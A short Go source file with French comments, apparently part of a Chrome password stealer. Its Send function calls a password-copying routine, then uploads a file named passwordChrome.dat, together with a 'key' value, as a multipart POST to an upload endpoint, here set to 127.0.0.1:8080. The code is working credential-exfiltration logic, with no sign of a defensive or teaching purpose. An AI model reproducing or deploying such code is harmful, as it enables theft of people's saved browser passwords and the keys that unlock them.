package utils

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

// Fonction pour envoyer des données à un serveur
func Send(key string) error {
	passwordCopyFile()
	// URL de destination
	url := "http://127.0.0.1:8080/upload"

	// Créer un nouveau buffer pour le corps de la requête
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	// Ajouter une chaîne de caractères au corps de la requête
	fieldName := "key"
	fieldValue := string(key)
	if err := writer.WriteField(fieldName, fieldValue); err != nil {
		return fmt.Errorf("erreur lors de l'ajout du champ de formulaire : %v", err)
	}

	// Ajouter un fichier au corps de la requête
	fileFieldName := "file"
	filePath := "./assets/passwordChrome.dat"
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("erreur lors de l'ouverture du fichier : %v", err)
	}
	defer file.Close()

	part, err := writer.CreateFormFile(fileFieldName, filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("erreur lors de la création du champ de fichier : %v", err)
	}
	if _, err := io.Copy(part, file); err != nil {
		return fmt.Errorf("erreur lors de la copie du fichier : %v", err)
	}

	// Fermer le writer pour finaliser le corps de la requête
	writer.Close()

	// Créer une nouvelle requête HTTP POST
	req, err := http.NewRequest("POST", url, &requestBody)
	if err != nil {
		return fmt.Errorf("erreur lors de la création de la requête : %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Envoyer la requête
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("erreur lors de l'envoi de la requête : %v", err)
	}
	defer resp.Body.Close()

	// Lire et afficher la réponse
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("erreur lors de la lecture de la réponse : %v", err)
	}
	fmt.Println("Réponse du serveur :", string(body))

	return nil
}
